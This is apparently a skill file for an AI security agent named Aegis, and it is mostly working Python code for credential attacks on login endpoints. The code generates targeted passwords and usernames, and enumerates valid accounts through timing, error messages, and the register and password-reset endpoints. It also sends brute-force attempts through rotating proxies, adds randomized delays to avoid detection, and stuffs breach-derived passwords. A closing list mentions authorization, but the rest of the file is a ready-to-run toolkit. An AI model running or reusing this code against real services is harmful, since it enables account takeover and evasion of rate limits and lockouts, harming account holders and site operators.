---
name: credential_stuffing
description: Smart credential stuffing with wordlists, timing analysis, and account enumeration
---

# Credential Stuffing Module

Advanced credential testing beyond basic brute-force. Includes smart wordlists, timing analysis, and account enumeration.

## Capabilities

1. **Smart Wordlists** - Context-aware password generation
2. **Timing Analysis** - Detect valid vs invalid credentials
3. **Account Enumeration** - Find valid usernames/emails
4. **Rate Limit Bypass** - Distributed testing strategies
5. **Credential Stuffing** - Use breach databases

## Smart Wordlist Generation

### Context-Aware Passwords

```python
def generate_context_passwords(target_info: dict) -> list[str]:
    """Generate passwords based on target context."""
    passwords = []
    
    # Company name variations
    company = target_info.get("company", "")
    if company:
        passwords.extend([
            f"{company.lower()}123",
            f"{company.capitalize()}@123",
            f"{company.lower()}!",
            f"{company}2024",
            f"{company}2025",
        ])
    
    # Domain variations
    domain = target_info.get("domain", "")
    if domain:
        name = domain.split(".")[0]
        passwords.extend([
            f"{name}123",
            f"{name}@123",
            f"{name}!",
        ])
    
    # Common admin patterns
    admin_passwords = [
        "admin", "password", "123456", "qwerty",
        "letmein", "welcome", "monkey", "dragon",
        "master", "abc123", "password1", "admin123",
        "Admin@123", "Password1!", "P@ssw0rd",
    ]
    passwords.extend(admin_passwords)
    
    return list(set(passwords))
```

### Username Generation

```python
def generate_usernames(email: str = None, name: str = None) -> list[str]:
    """Generate potential usernames from email or name."""
    usernames = []
    
    if email:
        # Extract from email
        local = email.split("@")[0]
        usernames.extend([
            local,
            local.replace(".", ""),
            local.replace(".", "_"),
            local.split(".")[0],
        ])
    
    if name:
        # Generate from name
        parts = name.lower().split()
        if len(parts) >= 2:
            usernames.extend([
                parts[0],
                parts[-1],
                f"{parts[0][0]}{parts[-1]}",
                f"{parts[0]}.{parts[-1]}",
                f"{parts[0]}_{parts[-1]}",
                f"{parts[-1]}.{parts[0]}",
            ])
    
    # Common admin usernames
    admin_users = [
        "admin", "administrator", "root", "superuser",
        "test", "guest", "user", "support",
    ]
    usernames.extend(admin_users)
    
    return list(set(usernames))
```

## Timing Analysis

### Detect Valid Credentials

```python
import requests
import time
import statistics

def timing_analysis(url: str, usernames: list[str], password: str) -> dict:
    """Detect valid usernames by response timing."""
    results = {"valid_users": [], "evidence": []}
    
    timings = {}
    
    # Collect timing data for each username
    for username in usernames:
        times = []
        for _ in range(5):  # Multiple attempts for accuracy
            start = time.time()
            requests.post(url, json={
                "username": username,
                "password": password
            }, timeout=10)
            elapsed = time.time() - start
            times.append(elapsed)
        
        avg_time = statistics.mean(times)
        timings[username] = avg_time
    
    # Analyze timing differences
    avg_all = statistics.mean(timings.values())
    std_dev = statistics.stdev(timings.values()) if len(timings) > 1 else 0
    
    for username, timing in timings.items():
        # Valid usernames often take longer (password hashing)
        if timing > avg_all + std_dev:
            results["valid_users"].append(username)
            results["evidence"].append(
                f"{username}: {timing:.3f}s (avg: {avg_all:.3f}s)"
            )
    
    return results
```

### Response Difference Analysis

```python
def response_analysis(url: str, usernames: list[str], password: str) -> dict:
    """Detect valid usernames by response differences."""
    results = {"valid_users": [], "evidence": []}
    
    responses = {}
    
    # Collect response data for each username
    for username in usernames:
        resp = requests.post(url, json={
            "username": username,
            "password": password
        }, timeout=10)
        
        responses[username] = {
            "status": resp.status_code,
            "length": len(resp.text),
            "time": resp.elapsed.total_seconds(),
            "body": resp.text[:100],  # First 100 chars
        }
    
    # Analyze response differences
    # Group by status code
    by_status = {}
    for username, data in responses.items():
        status = data["status"]
        by_status.setdefault(status, []).append(username)
    
    # If one status code has fewer users, those are likely valid
    for status, users in by_status.items():
        if len(users) == 1:  # Unique response
            results["valid_users"].extend(users)
            results["evidence"].append(
                f"Unique response for: {users[0]}"
            )
    
    return results
```

## Account Enumeration

### Email Enumeration

```python
def enumerate_emails(url: str, emails: list[str]) -> dict:
    """Enumerate valid email addresses."""
    results = {"valid_emails": [], "evidence": []}
    
    for email in emails:
        # Method 1: Registration endpoint
        resp = requests.post(f"{url}/register", json={
            "email": email,
            "password": "test123"
        }, timeout=10)
        
        if "already exists" in resp.text.lower():
            results["valid_emails"].append(email)
            results["evidence"].append(f"Registered: {email}")
        
        # Method 2: Password reset
        resp = requests.post(f"{url}/forgot-password", json={
            "email": email
        }, timeout=10)
        
        if "reset link sent" in resp.text.lower():
            results["valid_emails"].append(email)
            results["evidence"].append(f"Reset sent: {email}")
    
    return results
```

### Username Enumeration

```python
def enumerate_usernames(url: str, usernames: list[str]) -> dict:
    """Enumerate valid usernames."""
    results = {"valid_usernames": [], "evidence": []}
    
    for username in usernames:
        # Method 1: Login error messages
        resp = requests.post(f"{url}/login", json={
            "username": username,
            "password": "wrongpassword"
        }, timeout=10)
        
        error_msg = resp.json().get("message", "").lower()
        
        if "invalid password" in error_msg:
            results["valid_usernames"].append(username)
            results["evidence"].append(f"Valid user: {username}")
        elif "user not found" in error_msg:
            results["evidence"].append(f"Invalid user: {username}")
    
    return results
```

## Rate Limit Bypass Strategies

### Distributed Testing

```python
import asyncio
import aiohttp

async def distributed_brute_force(url: str, usernames: list[str], 
                                   passwords: list[str], 
                                   proxy_list: list[str] = None) -> dict:
    """Distribute brute-force across multiple sources."""
    results = {"found": [], "tested": 0}
    
    async def test_credential(session, username, password, proxy=None):
        try:
            async with session.post(url, json={
                "username": username,
                "password": password
            }, proxy=proxy, timeout=10) as resp:
                if resp.status == 200:
                    return {"username": username, "password": password}
        except:
            pass
        return None
    
    async with aiohttp.ClientSession() as session:
        tasks = []
        for username in usernames:
            for password in passwords:
                proxy = None
                if proxy_list:
                    proxy = proxy_list[len(tasks) % len(proxy_list)]
                tasks.append(test_credential(session, username, password, proxy))
        
        results_list = await asyncio.gather(*tasks)
        results["found"] = [r for r in results_list if r]
        results["tested"] = len(tasks)
    
    return results
```

### Time-Distributed Testing

```python
import time
import random

def time_distributed_test(url: str, usernames: list[str], 
                          passwords: list[str], 
                          max_per_minute: int = 10) -> dict:
    """Distribute requests over time to avoid detection."""
    results = {"found": [], "tested": 0}
    
    delay = 60 / max_per_minute
    
    for username in usernames:
        for password in passwords:
            # Random delay between requests
            time.sleep(delay + random.uniform(0, 1))
            
            resp = requests.post(url, json={
                "username": username,
                "password": password
            }, timeout=10)
            
            results["tested"] += 1
            
            if resp.status_code == 200:
                results["found"].append({
                    "username": username,
                    "password": password
                })
    
    return results
```

## Credential Stuffing with Breach Data

### Use Breach Databases

```python
def breach_credential_stuffing(url: str, usernames: list[str], 
                                breach_passwords: list[str]) -> dict:
    """Test credentials from known breaches."""
    results = {"found": [], "evidence": []}
    
    # Prioritize commonly reused passwords
    priority_patterns = [
        r".*123$",      # Ends with 123
        r".*@\w+$",     # Contains @word
        r"^password\d*$",  # password + numbers
        r".*!",         # Ends with !
    ]
    
    # Sort by priority
    sorted_passwords = sorted(
        breach_passwords,
        key=lambda p: sum(1 for pat in priority_patterns 
                         if re.match(pat, p)),
        reverse=True
    )
    
    for username in usernames:
        for password in sorted_passwords[:100]:  # Top 100 only
            resp = requests.post(url, json={
                "username": username,
                "password": password
            }, timeout=10)
            
            if resp.status_code == 200:
                results["found"].append({
                    "username": username,
                    "password": password
                })
                results["evidence"].append(
                    f"Breach credential worked: {username}:{password}"
                )
                break  # Found one, move to next user
    
    return results
```

## Integration with Aegis

### Workflow

1. **Recon** - Gather target info (company, domain, tech stack)
2. **Username Generation** - Create candidate usernames
3. **Password Generation** - Create context-aware passwords
4. **Account Enumeration** - Find valid accounts
5. **Timing Analysis** - Detect valid credentials
6. **Brute Force** - Test credentials with rate limiting
7. **Credential Stuffing** - Try breach databases
8. **Report** - Document all findings

### Example Usage

```python
# In Aegis agent
from aegis.tools.credential_stuffing import (
    generate_usernames,
    generate_context_passwords,
    timing_analysis
)

# Step 1: Gather target info
target_info = {
    "company": "Acme Corp",
    "domain": "acme.com"
}

# Step 2: Generate candidates
usernames = generate_usernames(email="admin@acme.com", name="John Admin")
passwords = generate_context_passwords(target_info)

# Step 3: Test
results = timing_analysis(
    url="https://target.com/login",
    usernames=usernames[:20],
    password=passwords[0]
)

print(f"Valid users: {results['valid_users']}")
```

## Best Practices

1. **Always get authorization** before credential testing
2. **Use rate limiting** to avoid account lockouts
3. **Log all attempts** for audit trail
4. **Don't test production** without permission
5. **Document all findings** for reporting
